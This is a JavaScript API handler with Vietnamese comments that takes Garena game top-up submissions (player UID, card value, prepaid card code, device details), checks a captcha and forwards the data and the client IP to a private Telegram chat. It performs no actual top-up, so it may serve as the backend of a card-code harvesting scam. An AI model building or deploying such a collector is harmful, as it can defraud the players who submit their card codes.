export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { uid, menhgia, mathe, game, device, captchaToken } = req.body;

    if (!uid || !menhgia || !mathe || !game || !device || !captchaToken) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Lấy địa chỉ IP của client
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Xác thực captcha (v2 hoặc v3)
    const secretKey = process.env.RECAPTCHA_SECRET_KEY;
    if (!secretKey) {
        return res.status(500).json({ error: 'Captcha secret key not configured' });
    }

    try {
        const verificationUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captchaToken}`;
        const captchaRes = await fetch(verificationUrl, { method: 'POST' });
        const captchaData = await captchaRes.json();

        if (!captchaData.success) {
            return res.status(400).json({ error: 'Invalid captcha' });
        }
    } catch (error) {
        console.error('Captcha verification error:', error);
        return res.status(500).json({ error: 'Captcha verification failed' });
    }

    // Gửi Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        return res.status(500).json({ error: 'Telegram bot not configured' });
    }

    const message = `
🎮 **Giao dịch nạp thẻ Garena**

🆔 **UID:** ${uid}
🎯 **Game:** ${game}
💰 **Mệnh giá:** ${menhgia}
🎫 **Mã thẻ:** ${mathe}

📱 **Thiết bị:**
• Loại: ${device.type}
• HĐH: ${device.os}
• Trình duyệt: ${device.browser}

🌐 **IP:** ${ip}

⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}
    `;

    try {
        const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await telegramRes.json();
        if (!data.ok) throw new Error(data.description);

        return res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram error:', error);
        return res.status(500).json({ error: 'Failed to send message' });
    }
}